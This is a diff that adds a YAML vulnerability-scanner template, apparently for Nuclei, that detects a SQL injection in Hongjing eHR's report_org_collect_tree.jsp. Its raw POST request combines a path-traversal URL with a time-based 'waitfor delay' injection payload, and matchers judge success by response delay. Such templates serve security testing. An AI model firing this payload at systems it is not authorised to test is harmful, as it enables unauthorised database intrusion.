@@ -1,0 +1,35 @@
+id: poc-yaml-hongjing-ehr-report-org-collect-tree-sqli
+info:
+  name: 宏景eHR report_org_collect_tree.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template identifies a SQL injection vulnerability in 宏景eHR's report_org_collect_tree.jsp. The vulnerability is exploited by sending a crafted payload that causes a delay in the server response if the SQL injection is successful.
+
+variables:
+  t1: '{{rand_int(4, 9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        params=&isAction=2&cycle_id=2;waitfor%20delay%20'0:0:{{t1}}'--%20
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "len(body) == 0"
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
